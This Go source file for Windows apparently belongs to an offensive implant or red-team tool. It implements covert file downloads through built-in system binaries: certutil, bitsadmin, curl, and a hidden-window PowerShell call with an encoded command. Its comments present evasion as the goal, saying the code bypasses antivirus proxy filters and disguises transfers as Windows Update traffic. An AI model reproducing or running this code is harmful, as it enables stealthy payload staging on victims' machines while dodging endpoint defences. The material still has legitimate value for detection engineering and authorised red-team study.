//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"
)

// lolbinFetch downloads a file from url to localPath using the specified LOLBin.
// method: certutil | bitsadmin | curl | powershell (default: certutil)
func lolbinFetch(url, localPath, method string) error {
	switch strings.ToLower(method) {
	case "bitsadmin":
		return fetchBITSAdmin(url, localPath)
	case "curl":
		return fetchCURL(url, localPath)
	case "powershell", "ps":
		return fetchPowerShell(url, localPath)
	default: // certutil
		return fetchCertUtil(url, localPath)
	}
}

// fetchCertUtil downloads via certutil.exe — always present on Windows, bypasses many proxy AV filters.
// certutil is a trusted Microsoft binary (LOLBAS: lolbas-project.github.io/lolbas/Binaries/Certutil).
func fetchCertUtil(url, localPath string) error {
	out, err := exec.Command(
		"certutil.exe", "-urlcache", "-split", "-f", url, localPath,
	).CombinedOutput()
	if err != nil {
		return fmt.Errorf("certutil fetch failed: %v — %s", err, strings.TrimSpace(string(out)))
	}
	return nil
}

// fetchBITSAdmin downloads via bitsadmin.exe using the Background Intelligent Transfer Service.
// Transfers appear as Windows Update traffic; job is cleaned up after completion.
func fetchBITSAdmin(url, localPath string) error {
	jobName := fmt.Sprintf("job%d", time.Now().UnixNano()%100000)

	// Create BITS job, add file, then resume and wait
	steps := [][]string{
		{"bitsadmin.exe", "/create", jobName},
		{"bitsadmin.exe", "/addfile", jobName, url, localPath},
		{"bitsadmin.exe", "/resume", jobName},
	}
	for _, args := range steps {
		if out, err := exec.Command(args[0], args[1:]...).CombinedOutput(); err != nil {
			exec.Command("bitsadmin.exe", "/cancel", jobName).Run() //nolint
			return fmt.Errorf("bitsadmin %s failed: %v — %s", args[1], err, strings.TrimSpace(string(out)))
		}
	}

	// Poll until transfer complete (max 60 s)
	deadline := time.Now().Add(60 * time.Second)
	for time.Now().Before(deadline) {
		out, _ := exec.Command("bitsadmin.exe", "/info", jobName, "/verbose").Output()
		info := string(out)
		if strings.Contains(info, "TRANSFERRED") {
			exec.Command("bitsadmin.exe", "/complete", jobName).Run() //nolint
			return nil
		}
		if strings.Contains(info, "ERROR") || strings.Contains(info, "CANCELLED") {
			exec.Command("bitsadmin.exe", "/cancel", jobName).Run() //nolint
			return fmt.Errorf("bitsadmin transfer failed: job entered error state")
		}
		time.Sleep(2 * time.Second)
	}
	exec.Command("bitsadmin.exe", "/cancel", jobName).Run() //nolint
	return fmt.Errorf("bitsadmin transfer timed out after 60s")
}

// fetchCURL downloads via curl.exe — available on Windows 10 1803+ natively.
func fetchCURL(url, localPath string) error {
	out, err := exec.Command(
		"curl.exe", "-s", "-L", "--output", localPath, url,
	).CombinedOutput()
	if err != nil {
		return fmt.Errorf("curl fetch failed: %v — %s", err, strings.TrimSpace(string(out)))
	}
	return nil
}

// fetchPowerShell downloads via System.Net.WebClient — works on all PowerShell versions.
func fetchPowerShell(url, localPath string) error {
	psCmd := fmt.Sprintf(
		`(New-Object System.Net.WebClient).DownloadFile('%s','%s')`,
		url, localPath,
	)
	encoded := psEncode(psCmd)
	out, err := exec.Command(
		"powershell.exe",
		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-EncodedCommand", encoded,
	).CombinedOutput()
	if err != nil {
		return fmt.Errorf("powershell fetch failed: %v — %s", err, strings.TrimSpace(string(out)))
	}
	// Verify file was actually written
	if _, statErr := os.Stat(localPath); statErr != nil {
		return fmt.Errorf("powershell fetch: file not created at %s", localPath)
	}
	return nil
}
